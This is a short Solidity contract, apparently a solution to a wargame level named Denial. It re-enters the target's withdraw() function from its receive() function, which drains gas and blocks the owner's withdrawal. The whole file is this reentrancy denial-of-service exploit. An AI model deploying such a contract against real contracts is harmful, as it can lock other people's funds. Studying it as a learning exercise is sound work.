test// SPDX-License-Identifier: MIT
pragma solidity >=0.4.22 <0.9.0;
import './Denial.sol';


contract ExoTwenty {
    
    Denial denial;

    constructor(address payable _target) public{
        denial = Denial(_target);
    }

    receive() external payable {
        denial.withdraw();
    }

    function execute() public {
        denial.withdraw();
    }
}